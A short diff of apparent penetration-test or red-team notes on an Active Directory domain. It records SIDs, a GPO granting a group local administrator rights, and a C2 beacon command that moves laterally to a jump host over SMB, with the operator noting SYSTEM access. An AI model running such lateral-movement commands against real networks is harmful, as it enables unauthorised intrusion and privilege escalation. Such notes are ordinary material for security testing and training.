@@ -62,4 +62,8 @@ enclave acces S-1-5-21-1076548718-1118529210-2193484809-2601
 lets check the GPO for enclave access
 0FF094F9-69ED-476D-8DCB-1820DE60A666
 *S-1-5-21-1330904164-3792538338-293942156-2103__Memberof = *S-1-5-32-544
-okay so admin over JMP?
+okay so admin over JMP OU?
+
+[05/14 12:41:27] beacon> jump scshell64 enc-jmp-1.contoso.enclave smb
+we SYSTEM on jmp lets see what we can do
+
